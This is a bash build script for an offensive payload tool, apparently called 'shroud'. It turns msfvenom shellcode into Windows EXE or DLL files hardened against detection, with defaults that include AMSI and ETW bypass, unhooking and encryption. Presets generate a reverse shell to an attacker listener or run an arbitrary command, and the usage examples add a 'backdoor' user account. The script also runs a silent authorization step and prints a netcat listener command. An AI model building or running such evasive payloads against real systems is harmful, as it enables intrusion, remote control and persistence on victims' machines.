#!/usr/bin/env bash
#
# build.sh — one-shot pipeline: msfvenom shellcode -> shroud hardened EXE.
#
#   ./build.sh                                   # calc pop test (default)
#   ./build.sh revshell 10.10.14.5 4444          # reverse shell to your listener
#   ./build.sh exec "net user /add backdoor P@ss"
#   ./build.sh raw ./myshellcode.bin             # bring-your-own shellcode
#
#   options (anywhere):  -e <evasion>  -t <tech>  -f exe|dll  -o <name>  --process <exe>  --no-build
#
#   examples:
#     ./build.sh revshell 10.10.14.5 4444 -e dynamic-api,aes,etw
#     ./build.sh calc -t pe25 --process explorer.exe
#     ./build.sh raw sc.bin -f dll
#
#   output:  dist/<name>.exe   (final, ready to run on a Windows host)
#
set -euo pipefail
cd "$(dirname "$0")"

# ---- defaults ---------------------------------------------------------------
PRESET="calc"
PRESET_ARGS=()
TECH="pe26"
EVASION="aes,stomp,callbacks,dynamic-api,etw,amsi,unhook-kd"
FORMAT="exe"
NAME=""
PROCESS=""
NOBUILD=0

usage() {
  sed -n '3,21p' "$0" | sed 's/^# \{0,1\}//'
}

# ---- parse args -------------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -e)         EVASION="$2";    shift 2;;
    -t)         TECH="$2";       shift 2;;
    -f)         FORMAT="$2";     shift 2;;
    -o)         NAME="$2";       shift 2;;
    --process)  PROCESS="$2";    shift 2;;
    -p)         PROCESS="$2";    shift 2;;
    --no-build) NOBUILD=1;       shift;;
    -h|--help)  usage; exit 0;;
    calc|revshell|exec|raw) PRESET="$1"; shift;;
    -*) echo "unknown option: $1" >&2; usage; exit 1;;
    *)  PRESET_ARGS+=("$1"); shift;;
  esac
done

# ---- dependency checks ------------------------------------------------------
need() { command -v "$1" >/dev/null 2>&1 || { echo "missing dependency: $1 ($2)" >&2; exit 1; }; }

if [ "$PRESET" != "raw" ]; then
  need msfvenom "apt install metasploit-framework"
fi
need x86_64-w64-mingw32-gcc "apt install mingw-w64"
[ -x ./shroud ] || { echo "run this from the shroud repo root (./shroud not found)" >&2; exit 1; }

if [[ "$EVASION" == *aes* ]]; then
  python3 -c "import Crypto" 2>/dev/null || {
    echo "AES layer needs pycryptodome — installing:" >&2
    pip install --quiet pycryptodome
  }
fi

# one-time authorization gate (records a local marker; prints nothing loud)
if [ ! -f ~/.shroud_authorized ]; then
  ./shroud authorize < /dev/null >/dev/null 2>&1 || true
fi

# ---- 1. produce raw shellcode -----------------------------------------------
SC="$(mktemp --suffix=.bin)"
trap 'rm -f "$SC"' EXIT
case "$PRESET" in
  calc)
    echo ">> generating shellcode: windows/x64/exec CMD=calc.exe"
    msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="calc"
    ;;
  revshell)
    LHOST="${PRESET_ARGS[0]:-}"
    LPORT="${PRESET_ARGS[1]:-4444}"
    if [ -z "$LHOST" ]; then echo "revshell needs LHOST: ./build.sh revshell <LHOST> [LPORT]" >&2; exit 1; fi
    echo ">> generating shellcode: windows/x64/shell_reverse_tcp $LHOST:$LPORT"
    msfvenom -p windows/x64/shell_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="revshell_${LHOST}_${LPORT}"
    ;;
  exec)
    CMD="${PRESET_ARGS[0]:-}"
    if [ -z "$CMD" ]; then echo "exec needs a command: ./build.sh exec \"<cmd>\"" >&2; exit 1; fi
    echo ">> generating shellcode: windows/x64/exec CMD=\"$CMD\""
    msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o "$SC" EXITFUNC=thread 2>/dev/null
    [ -n "$NAME" ] || NAME="exec"
    ;;
  raw)
    SRC="${PRESET_ARGS[0]:-}"
    [ -f "$SRC" ] || { echo "shellcode file not found: $SRC" >&2; exit 1; }
    cp "$SRC" "$SC"
    echo ">> using supplied shellcode: $SRC ($(wc -c <"$SC") bytes)"
    [ -n "$NAME" ] || NAME="custom"
    ;;
esac
echo "   shellcode: $(wc -c <"$SC") bytes"

# ---- 2. generate + build via shroud -----------------------------------------
PROJ="out/build_${NAME}"
GEN_ARGS=(generate "$TECH" -s "$SC" -e "$EVASION" -f "$FORMAT" -o "$PROJ")
[ -n "$PROCESS" ] && GEN_ARGS+=(--process "$PROCESS")
[ "$NOBUILD" -eq 1 ] && GEN_ARGS+=(--no-build)

echo ">> shroud ${GEN_ARGS[*]}"
./shroud "${GEN_ARGS[@]}" | sed 's/^/   /'

# ---- 3. copy the final artifact somewhere obvious ---------------------------
if [ "$FORMAT" == "c" ] || [ "$NOBUILD" -eq 1 ]; then
  echo
  echo "==============================================="
  echo " DONE (source only) -> $PROJ/"
  echo "   cd $PROJ && make"
  echo "==============================================="
  exit 0
fi

mkdir -p dist
EXT="$FORMAT"            # exe | dll
SRC_EXE="$PROJ/$(basename "$PROJ").$EXT"
[ -f "$SRC_EXE" ] || SRC_EXE="$(ls "$PROJ"/*.$EXT | head -1)"
FINAL="dist/${NAME}.${EXT}"
cp "$SRC_EXE" "$FINAL"

echo
echo "==============================================="
echo " DONE -> $FINAL   ($(wc -c <"$FINAL") bytes)"
echo " technique: $TECH"
echo " evasion  : $EVASION"
if [ "$PRESET" == "revshell" ]; then
  echo " listener : nc -lvnp ${PRESET_ARGS[1]:-4444}"
fi
echo "==============================================="
